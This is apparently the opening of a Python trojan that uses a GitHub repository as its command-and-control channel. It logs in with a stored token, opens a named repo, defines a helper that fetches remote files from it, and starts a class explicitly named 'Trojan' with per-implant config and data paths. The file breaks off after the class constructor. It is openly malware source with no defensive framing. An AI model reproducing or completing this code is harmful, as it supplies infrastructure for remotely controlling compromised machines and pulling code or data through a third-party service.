import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():
    with open('mytoken.txt') as f:
        token = f.read()
    user = 'Opifex-chathamicus'
    sess = github3.login(token=token)
    return sess.repository(user, 'Konopzzzz')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()